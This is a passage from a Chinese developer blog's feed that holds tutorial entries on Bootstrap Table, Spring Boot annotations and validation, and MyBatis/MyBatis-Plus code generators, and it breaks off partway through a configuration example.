class="string">'#tb_departments'</span>).bootstrapTable(&#123;&#125;)</span><br></pre></td></tr></table></figure></div><p><strong>这个就像table的入口一样。也是初始化表格一样。此时对应的html是</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">id</span>=<span class="string">"tb_departments"</span> <span class="attr">data-filter-control</span>=<span class="string">"true"</span> <span class="attr">data-show-columns</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure></div><hr><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JS"><figure class="iseeu highlight /js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">columns:[&#123;<span class="attr">field</span>: <span class="string">'Key'</span>, <span class="attr">title</span>: <span class="string">'文件路径'</span>,<span class="attr">formatter</span>: <span class="function"><span class="keyword">function</span>(<span class="params">value,row,index</span>)</span>&#123;&#125; &#125;]</span><br></pre></td></tr></table></figure></div><ul><li><strong>columns</strong> <ul><li><strong>field json中键值对中的Key</strong></li><li><strong>title是表格头显示的内容</strong></li><li><strong>formatter 是一个函数类型。当我们对数据内容需要修改时(例：编码转换).</strong></li></ul></li></ul><hr><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JS"><figure class="iseeu highlight /js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">events:operateEvents</span><br><span class="line"> <span class="built_in">window</span>.operateEvents = &#123;</span><br><span class="line">        <span class="string">'click .download'</span>: <span class="function"><span class="keyword">function</span> (<span class="params">e,value,row,index</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(row);</span><br><span class="line">xxx();</span><br><span class="line">        &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div><p><strong>事件触发器，因为很多时候我们需要针对表格进行处理，所以事件触发器是一个不错的选择。它可以记录我们的行数据，可以利用触发器进行函数执行等。</strong></p><p><strong>其余内容查看注释选择使用就可以了。</strong></p><h2 id="四，表格导出"><a href="#四，表格导出" class="headerlink" title="四，表格导出"></a>四，表格导出</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/bootstrap-table-export.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JS"><figure class="iseeu highlight /js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showExport: <span class="literal">true</span>,                     <span class="comment">//是否显示导出</span></span><br></pre></td></tr></table></figure></div><h2 id="5，总结"><a href="#5，总结" class="headerlink" title="5，总结"></a>5，总结</h2><p><strong>其实只是简单的阐述如何使用，你可以去查看下载的文件，你会发现Bootstrap 还有超多的插件我们并没有使用。后续我使用到了新的我再进行补充。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> boostatrp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 学习笔记</title>
      <link href="/2019/05/24/spring-boot-xue-xi-bi-ji/"/>
      <url>/2019/05/24/spring-boot-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Boot-学习笔记"><a href="#Spring-Boot-学习笔记" class="headerlink" title="Spring Boot 学习笔记"></a>Spring Boot 学习笔记</h1><h2 id="注释器"><a href="#注释器" class="headerlink" title="注释器"></a>注释器</h2><h3 id="Aspect"><a href="#Aspect" class="headerlink" title="@Aspect"></a>@Aspect</h3><blockquote><h3 id="把当前的注释类标识为一个切面供容器读取"><a href="#把当前的注释类标识为一个切面供容器读取" class="headerlink" title="把当前的注释类标识为一个切面供容器读取"></a>把当前的注释类标识为一个切面供容器读取</h3></blockquote><h3 id="ResponseBody"><a href="#ResponseBody" class="headerlink" title="@ResponseBody"></a>@ResponseBody</h3><blockquote><h4 id="此方法返回的是文本而不是视图"><a href="#此方法返回的是文本而不是视图" class="headerlink" title="此方法返回的是文本而不是视图"></a>此方法返回的是文本而不是视图</h4></blockquote><p>###　@RestController</p><blockquote><h4 id="RestController-Controller-ResponseBody"><a href="#RestController-Controller-ResponseBody" class="headerlink" title="RestController = @Controller + @ResponseBody"></a>RestController = @Controller + @ResponseBody</h4></blockquote><h3 id="Component"><a href="#Component" class="headerlink" title="@Component"></a>@Component</h3><blockquote><h4 id="声明此类是一个Spring管理的类"><a href="#声明此类是一个Spring管理的类" class="headerlink" title="声明此类是一个Spring管理的类"></a>声明此类是一个Spring管理的类</h4></blockquote><h3 id="Configuration"><a href="#Configuration" class="headerlink" title="@Configuration"></a>@Configuration</h3><blockquote><h4 id="声明此类是一个配置类，通常与注解-Bean配合使用"><a href="#声明此类是一个配置类，通常与注解-Bean配合使用" class="headerlink" title="声明此类是一个配置类，通常与注解@Bean配合使用"></a>声明此类是一个配置类，通常与注解@Bean配合使用</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DataSourceConfig</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span>(name = <span class="string">"datasoucre"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> DataSource <span class="title">dataSource</span><span class="params">(Environment env)</span></span>&#123;</span><br><span class="line">        DruidDataSource druidDataSource = <span class="keyword">new</span> DruidDataSource();</span><br><span class="line">        druidDataSource.setUrl(env.getProperty(<span class="string">"spring.datasource.url"</span>));</span><br><span class="line">        druidDataSource.setUsername(env.getProperty(<span class="string">"spring.datasource.username"</span>));</span><br><span class="line">        druidDataSource.setPassword(env.getProperty(<span class="string">"spring.datasource.password"</span>));</span><br><span class="line">        druidDataSource.setDriverClassName(env.getProperty(<span class="string">"spring.datasource.driver-class-name"</span>));</span><br><span class="line">        <span class="keyword">return</span> druidDataSource;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="＠RequestMapping"><a href="#＠RequestMapping" class="headerlink" title="＠RequestMapping"></a>＠RequestMapping</h3><blockquote><h4 id="Spring提供了简化后的-RequestMapping，提供了新的注解来表示http方法："><a href="#Spring提供了简化后的-RequestMapping，提供了新的注解来表示http方法：" class="headerlink" title="Spring提供了简化后的@RequestMapping，提供了新的注解来表示http方法："></a>Spring提供了简化后的@RequestMapping，提供了新的注解来表示http方法：</h4></blockquote><ul><li><p><strong>@GetMapping</strong> </p></li><li><p><strong>@PostMapping</strong></p></li><li><p><strong>@DeleteMapping</strong></p></li><li><p><strong>@PutMapping</strong></p></li><li><p><strong>@PatchMapping</strong></p><hr></li></ul><h4 id="属性consumes意味着请求的http头的Content-Type媒体类型与consumes匹配才能调用此方法"><a href="#属性consumes意味着请求的http头的Content-Type媒体类型与consumes匹配才能调用此方法" class="headerlink" title="属性consumes意味着请求的http头的Content-Type媒体类型与consumes匹配才能调用此方法"></a>属性consumes意味着请求的http头的Content-Type媒体类型与consumes匹配才能调用此方法</h4>  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(value=(<span class="string">"/test.json"</span>),consumes=<span class="string">"appliation/json"</span>)</span><br></pre></td></tr></table></figure></div><h5 id="这里映射的请求媒体类型是application-json，所以无法接收到Ajax的请求方法。"><a href="#这里映射的请求媒体类型是application-json，所以无法接收到Ajax的请求方法。" class="headerlink" title="这里映射的请求媒体类型是application/json，所以无法接收到Ajax的请求方法。"></a>这里映射的请求媒体类型是<strong>application/json</strong>，所以无法接收到Ajax的请求方法。</h5><hr><h4 id="produces-属性对应于-HTTP-请求-Accept-字段-只有匹配得上的方法才能被调用。"><a href="#produces-属性对应于-HTTP-请求-Accept-字段-只有匹配得上的方法才能被调用。" class="headerlink" title="produces 属性对应于 HTTP 请求 Accept 字段 只有匹配得上的方法才能被调用。"></a>produces 属性对应于 HTTP 请求 Accept 字段 只有匹配得上的方法才能被调用。</h4>  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(path=<span class="string">"/user/&#123;userID&#125;"</span>,produces=MediaType.APPLICATION_JSON_UTF8_VALUE)</span><br></pre></td></tr></table></figure></div><hr><h2 id="方法参数"><a href="#方法参数" class="headerlink" title="方法参数"></a>方法参数</h2><ul><li><p><strong>@PathVariable，可以将URL的值映射到方法参数中。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/user/&#123;id&#125;"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">user</span><span class="params">(@PathVariable Long id)</span></span></span><br></pre></td></tr></table></figure></div></li></ul><ul><li><p><strong>Model，Spring中通用的MVC模型，也可以使用Map和ModelMap作为渲染视图的模型</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User userinfo = userService.getUserByName(userid);</span><br><span class="line">model.addAttribute(<span class="string">"user"</span>,userinfo);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"user.jsp"</span>;</span><br></pre></td></tr></table></figure></div><h5 id="将获得的userinfo的信息绑定到在user中。我们在user-jsp中即可调用。使用方法为："><a href="#将获得的userinfo的信息绑定到在user中。我们在user-jsp中即可调用。使用方法为：" class="headerlink" title="将获得的userinfo的信息绑定到在user中。我们在user.jsp中即可调用。使用方法为："></a><del>将获得的userinfo的信息绑定到在user中。我们在user.jsp中即可调用。使用方法为：</del></h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&#123;user&#125;&#125;</span><br></pre></td></tr></table></figure></div></li></ul><ul><li><p><strong>ModelAndView，包含了模型和视图路径</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(ModelAndView model)</span></span>&#123;</span><br><span class="line">    model.addObject(<span class="string">"user"</span>,userinfo);</span><br><span class="line">    model.setViewName(<span class="string">"hello.jsp"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p><strong>MultipartFile,用于处理文件上传</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(<span class="string">"/form"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">handleFormUpload</span><span class="params">(String name,MultipartFile file)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!file.isEmpty()) &#123;</span><br><span class="line">        String filename = file.getOriginalFilename();</span><br><span class="line">        InputStream ins = file.getInputStream();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"failure"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><strong>MultipartFile提供了以下方法来获取上传的文件信息：</strong></p><ul><li><strong>getOriginalFilename，获取上传的文件名字；</strong></li><li><strong>getBytes，获取上传文件内容，转为字节数组。</strong></li><li><strong>getInputStream，获取一个InputStream</strong></li><li><strong>getSize，获取文件大小。</strong></li><li><strong>isEmpty，文件上传内容为空，或者就没有文件上传。</strong></li><li><strong>transferTo(File dest),保存上传文件到目标文件系统。</strong></li></ul></li></ul><h2 id="验证框架"><a href="#验证框架" class="headerlink" title="验证框架"></a>验证框架</h2><h3 id="JSR-303"><a href="#JSR-303" class="headerlink" title="JSR-303"></a>JSR-303</h3><blockquote><h4 id="JSR-303是Java标准的验证框架，已有的实现有Hibernate-validator。"><a href="#JSR-303是Java标准的验证框架，已有的实现有Hibernate-validator。" class="headerlink" title="JSR-303是Java标准的验证框架，已有的实现有Hibernate validator。"></a>JSR-303是Java标准的验证框架，已有的实现有Hibernate validator。</h4></blockquote><ul><li><p><strong>空检查</strong></p><ul><li><p><strong>@Null，验证对象为空</strong></p></li><li><p><strong>@NotNull，验证对象不为空。</strong></p></li><li><p><strong>@NotBlank，验证字符串不为空或者不是空字符串。</strong></p></li><li><p><strong>NotEmpty，验证字符不为空，或者字符集不为空。</strong></p></li></ul></li></ul><ul><li><p><strong>长度检查</strong></p><ul><li><strong>@Size(min=,max=),验证字符长度，支持字符串，字符集。</strong></li><li><strong>@Lenth，字符长度。</strong></li></ul></li><li><p><strong>数值检测</strong></p><ul><li><strong>@Min，验证数字是否大于等于指定值。</strong></li><li><strong>@Max，验证数字是否小于等于指定值。</strong></li><li><strong>@Digits，验证数字是否符合指定格式，如@Digits(integer=2，fraction=1)</strong></li><li><strong>@Range，验证数字是否在指定的范围内。@Range(min=1，max=5)</strong></li></ul></li><li><p>其他</p><ul><li><strong>@Email，验证是否为邮箱格式，为null则不做校验。</strong></li><li><strong>@Pattern，验证String对象是否符合正则表达式的规则。</strong></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBootの代码生成器</title>
      <link href="/2019/05/16/springbootnodai-ma-sheng-cheng-qi/"/>
      <url>/2019/05/16/springbootnodai-ma-sheng-cheng-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringBootの代码生成器"><a href="#SpringBootの代码生成器" class="headerlink" title="SpringBootの代码生成器"></a>SpringBootの代码生成器</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>之前我们在使用SpringMVC的时候也讲到代码生成器。可以看<a href="https://kalifun.top/archives/214" target="_blank" rel="noopener">代码自动生成器のgeneratorconfig.xml</a>进行了解。代码生成器的好处就不用多说了，反正让我们可以快速搭建一个项目就对了。</p></blockquote><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>配置pox.xml</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- mybatisplus与springboot整合 --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.baomidou&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.0.5&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- velocity 模板引擎, 默认 --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.velocity&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;velocity-engine-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.0&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- freemarker 模板引擎 --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.freemarker&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;freemarker&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.3.28&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- mysql数据库连接驱动 --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;5.1.31&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!--阿里druid数据库链接依赖--&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;druid&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.1.12&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div><p>我们这里发现一个和我们之前提到不相同的东西那就是Mybatis-puls。</p><blockquote><p> MyBatis-Plus（简称 MP）是一个 MyBatis 的增强工具，在 MyBatis 的基础上只做增强不做改变，为简化开发、提高效率而生。</p></blockquote><h3 id="编写生成器程序"><a href="#编写生成器程序" class="headerlink" title="编写生成器程序"></a>编写生成器程序</h3><p> 到这步肯定都很懵了，就直接写生成器程序啦？对的，这里并不是采用的xml来配置生成器。而且是采用的springboot并没有之前繁琐的配置了。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">public class CodeGenerator &#123;</span><br><span class="line">    public static String scanner(String tip)&#123;</span><br><span class="line">        Scanner scanner = new Scanner(System.in);</span><br><span class="line">        StringBuilder help = new StringBuilder();</span><br><span class="line">        help.append(&quot;请输入&quot;+tip+&quot;:&quot;);</span><br><span class="line">        System.out.println(help.toString());</span><br><span class="line">        if (scanner.hasNext())&#123;</span><br><span class="line">            String ipt = scanner.next();</span><br><span class="line">            if (StringUtils.isNotEmpty(ipt))&#123;</span><br><span class="line">                return ipt;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        throw new MybatisPlusException(&quot;请输入正确的&quot;+tip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        AutoGenerator mpg = new AutoGenerator();</span><br><span class="line"></span><br><span class="line">        GlobalConfig gc = new GlobalConfig();</span><br><span class="line">        String projectPath = System.getProperty(&quot;user.dir&quot;);</span><br><span class="line">        gc.setOutputDir(projectPath+&quot;/src/main/java&quot;);</span><br><span class="line">        gc.setOpen(false);</span><br><span class="line"></span><br><span class="line">        gc.setFileOverride(true);</span><br><span class="line">        gc.setActiveRecord(false);</span><br><span class="line">        gc.setEnableCache(false);</span><br><span class="line">        gc.setBaseResultMap(true);</span><br><span class="line">        gc.setBaseColumnList(false);</span><br><span class="line">        gc.setAuthor(&quot;fun&quot;);</span><br><span class="line">        mpg.setGlobalConfig(gc);</span><br><span class="line"></span><br><span class="line">        DataSourceConfig dsc = new DataSourceConfig();</span><br><span class="line">        dsc.setUrl(&quot;jdbc:mysql://localhost:3306/ssm?useUnicode=true&amp;useSSL=false&amp;characterEncoding=utf8&quot;);     //连接数据库地址</span><br><span class="line">        dsc.setDriverName(&quot;com.mysql.jdbc.Driver&quot;);       //连接数据库的驱动</span><br><span class="line">        dsc.setUsername(&quot;root&quot;);                     //数据库用户名</span><br><span class="line">        dsc.setPassword(&quot;root&quot;);                      //数据库密码</span><br><span class="line">        mpg.setDataSource(dsc);</span><br><span class="line"></span><br><span class="line">        PackageConfig pc = new PackageConfig();</span><br><span class="line">        pc.setModuleName(scanner(&quot;模块名&quot;));          //生成的代码将在此处输入的文件夹目录下</span><br><span class="line">        pc.setParent(&quot;top.kalifun.imgurl&quot;);                   //创建项目时的src/java下的目录</span><br><span class="line">        mpg.setPackageInfo(pc); </span><br><span class="line"></span><br><span class="line">        InjectionConfig cfg = new InjectionConfig() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void initMap() &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        List&lt;FileOutConfig&gt; focList = new ArrayList&lt;&gt;();</span><br><span class="line">        focList.add(new FileOutConfig(&quot;/templates/mapper.xml.ftl&quot;) &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public String outputFile(TableInfo tableInfo) &#123;</span><br><span class="line">                return projectPath + &quot;/src/main/resources/mapper/&quot; + pc.getModuleName() + &quot;/&quot; + tableInfo.getEntityName() + &quot;Mapper&quot; + StringPool.DOT_XML;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        cfg.setFileOutConfigList(focList);</span><br><span class="line">        mpg.setCfg(cfg);</span><br><span class="line">        mpg.setTemplate(new TemplateConfig().setXml(null));</span><br><span class="line"></span><br><span class="line">        StrategyConfig strategy = new StrategyConfig();</span><br><span class="line">        strategy.setNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">        strategy.setColumnNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">        strategy.setRestControllerStyle(true);</span><br><span class="line">        strategy.setInclude(scanner(&quot;表名&quot;));             //输入你需要生成此表相关的代码</span><br><span class="line">        strategy.setSuperEntityColumns(&quot;id&quot;);</span><br><span class="line">        strategy.setControllerMappingHyphenStyle(true);</span><br><span class="line">        strategy.setTablePrefix(pc.getModuleName()+&quot;_&quot;);</span><br><span class="line">        mpg.setStrategy(strategy);</span><br><span class="line">        mpg.setTemplateEngine(new FreemarkerTemplateEngine());</span><br><span class="line">        mpg.execute();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这个可以定义为一个脚手架，当你需要自动生成代码时，直接对此代码进行修改就可以直接使用了，对效率提升是不是很大。<br><img src="https://image.kalifun.top/temp/1905/5879ce03f08a51af.png" alt="![](https://image.kalifun.top/temp/1905/5879ce03f08a51af.png)"><br>此程序可以直接运行，执行后将会获得执行log<br><img src="https://image.kalifun.top/temp/1905/2bdf13cd16a6c3e5.png" alt="![](https://image.kalifun.top/temp/1905/2bdf13cd16a6c3e5.png)"><br>我们将会获得controller,entity,mapper,service文件夹。在resource目录下的mapper也会根据数据库创建相应的mapper.xml文件。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码自动生成器のgeneratorconfig.xml</title>
      <link href="/2019/05/08/dai-ma-zi-dong-sheng-cheng-qi-nogeneratorconfig/"/>
      <url>/2019/05/08/dai-ma-zi-dong-sheng-cheng-qi-nogeneratorconfig/</url>
      
        <content type="html"><![CDATA[<h1 id="代码自动生成器のgeneratorconfig-xml"><a href="#代码自动生成器のgeneratorconfig-xml" class="headerlink" title="代码自动生成器のgeneratorconfig.xml"></a>代码自动生成器のgeneratorconfig.xml</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>当我们写Java项目的时候，我们和数据相关时必定要写Dao，DaoMapper，Model相关的实体和接口。我觉得很无脑的敲，虽然很多都有补全，但是感觉还是没有自动生成快。</p></blockquote><h2 id="配置pom-xml"><a href="#配置pom-xml" class="headerlink" title="配置pom.xml"></a>配置pom.xml</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;mybatis-generator-core&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.3.5&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    ---------------------------------------------------------</span><br><span class="line">    下面是写在&lt;build&gt;下面的</span><br><span class="line">    &lt;plugin&gt;</span><br><span class="line">        &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;mybatis-generator-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.3.5&lt;/version&gt;</span><br><span class="line">        &lt;configuration&gt;</span><br><span class="line">          &lt;verbose&gt;true&lt;/verbose&gt;</span><br><span class="line">          &lt;overwrite&gt;true&lt;/overwrite&gt;</span><br><span class="line">        &lt;/configuration&gt;</span><br><span class="line">      &lt;/plugin&gt;</span><br></pre></td></tr></table></figure></div><h2 id="在recourse下面创建application-properties"><a href="#在recourse下面创建application-properties" class="headerlink" title="在recourse下面创建application.properties"></a>在recourse下面创建application.properties</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span 